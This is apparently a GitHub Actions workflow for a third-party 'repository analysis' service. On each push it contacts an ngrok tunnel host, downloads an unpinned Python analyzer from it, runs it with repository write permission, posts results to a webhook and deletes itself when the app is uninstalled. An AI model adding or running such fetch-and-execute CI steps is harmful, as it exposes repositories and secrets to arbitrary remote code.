# workflow-version: 026.10.30-Beta.2
name: Cytecs Enhanced Repository Analysis

on:
  push:
    branches: [ "**" ]
  pull_request:
    types: [opened, synchronize, reopened]
  workflow_dispatch:

env:
  WORKFLOW_VERSION: "026.10.30-Beta.2"

jobs:
  analyze:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: write
      actions: read

    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      - name: Load webhook configuration
        env:
          WEBHOOK_CONFIG: ${{ secrets.WEBHOOK_CONFIG }}
        run: |
          if [ -z "$WEBHOOK_CONFIG" ]; then
            echo "WEBHOOK_CONFIG secret is not set!"
            exit 1
          fi
          mapfile -t PARTS <<< "$(printf '%s' "$WEBHOOK_CONFIG" | sed 's/::#?::/\n/g')"
          WEBHOOK_ENDPOINT="${PARTS[0]}"
          WEBHOOK_API_TOKEN="${PARTS[1]}"
          BASE_URL="${PARTS[2]:-https://anthroponomical-helena-unsynchronised.ngrok-free.dev}"
          if [ -z "$WEBHOOK_ENDPOINT" ] || [ -z "$WEBHOOK_API_TOKEN" ]; then
            echo "WEBHOOK_CONFIG is malformed"
            exit 1
          fi
          echo "::add-mask::$WEBHOOK_API_TOKEN"
          {
            echo "WEBHOOK_ENDPOINT=$WEBHOOK_ENDPOINT"
            echo "WEBHOOK_API_TOKEN=$WEBHOOK_API_TOKEN"
            echo "BASE_URL=$BASE_URL"
          } >> "$GITHUB_ENV"

      - name: Check GitHub App installation & Integrity
        id: check_install
        env:
          GH_REF_NAME: ${{ github.head_ref || github.ref_name }}
          GH_COMMIT_SHA: ${{ github.sha }}
        run: |
          WORKFLOW_FILE=".github/workflows/repo-analysis.yml"
          if [ -f "$WORKFLOW_FILE" ]; then
            WORKFLOW_HASH=$(tr -d '\r' < "$WORKFLOW_FILE" | sha256sum | cut -d' ' -f1)
          else
            WORKFLOW_HASH="missing"
          fi
          TREE_HASH=$(git rev-parse "HEAD^{tree}" 2>/dev/null || echo "")

          HTTP=$(curl -s -o "$RUNNER_TEMP/status.json" -w "%{http_code}" \
            -H "X-API-Token: $WEBHOOK_API_TOKEN" \
            -H "X-Repository: ${{ github.repository }}" \
            -H "X-Run-ID: ${{ github.run_id }}" \
            -H "X-Workflow-Version: $WORKFLOW_VERSION" \
            -H "X-Workflow-Hash: $WORKFLOW_HASH" \
            -H "X-Tree-Hash: $TREE_HASH" \
            -H "X-Ref-Name: $GH_REF_NAME" \
            -H "X-Commit-SHA: $GH_COMMIT_SHA" \
            --max-time 20 --retry 2 \
            "$BASE_URL/webhook/status" || echo "000")
          echo "status_code=$HTTP" >> "$GITHUB_OUTPUT"
          
          if [ "$HTTP" = "410" ]; then
            echo "app_uninstalled=true" >> "$GITHUB_OUTPUT"
            echo "skip_scan=false" >> "$GITHUB_OUTPUT"
          else
            echo "app_uninstalled=false" >> "$GITHUB_OUTPUT"
            INTEGRITY=$(python3 -c "import json,sys; d=json.load(open(sys.argv[1])); print(d.get('workflow_integrity',''))" "$RUNNER_TEMP/status.json" 2>/dev/null || echo "")
            DECISION=$(python3 -c "import json,sys; d=json.load(open(sys.argv[1])); print(d.get('scan_decision',''))" "$RUNNER_TEMP/status.json" 2>/dev/null || echo "")
            if [ "$INTEGRITY" = "restored" ] || [ "$INTEGRITY" = "tampered" ]; then
              echo "skip_scan=true" >> "$GITHUB_OUTPUT"
            elif [ "$DECISION" = "skip_unchanged" ]; then
              echo "skip_scan=true" >> "$GITHUB_OUTPUT"
            else
              echo "skip_scan=false" >> "$GITHUB_OUTPUT"
            fi
          fi

      - name: Download analyzer
        if: steps.check_install.outputs.app_uninstalled != 'true' && steps.check_install.outputs.skip_scan != 'true'
        run: |
          curl -L -f -o enhanced_analyzer.py "$BASE_URL/enhanced_analyzer.py?t=$WEBHOOK_API_TOKEN" \
            --connect-timeout 15 --max-time 60 --retry 3

      - name: Run analyzer
        if: steps.check_install.outputs.app_uninstalled != 'true' && steps.check_install.outputs.skip_scan != 'true'
        run: timeout 240 python3 enhanced_analyzer.py

      - name: Send result
        if: steps.check_install.outputs.app_uninstalled != 'true' && steps.check_install.outputs.skip_scan != 'true'
        run: |
          HTTP=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$WEBHOOK_ENDPOINT" \
            -H "Content-Type: application/json" \
            -H "X-API-Token: $WEBHOOK_API_TOKEN" \
            -H "X-Repository: ${{ github.repository }}" \
            -H "X-Run-ID: ${{ github.run_id }}" \
            --max-time 60 --retry 2 \
            -d @enhanced_analysis_result.json)
          echo "POST -> $HTTP"

      - name: Remove workflow (App uninstalled)
        if: steps.check_install.outputs.app_uninstalled == 'true'
        continue-on-error: true
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          FILE=".github/workflows/repo-analysis.yml"
          SHA=$(gh api "/repos/${{ github.repository }}/contents/$FILE?ref=${{ github.ref_name }}" --jq .sha 2>/dev/null) || exit 0
          [ -z "$SHA" ] && exit 0
          gh api --method DELETE "/repos/${{ github.repository }}/contents/$FILE" \
            -f message="chore: remove analysis workflow (App not installed)" \
            -f sha="$SHA" -f branch="${{ github.ref_name }}" || true
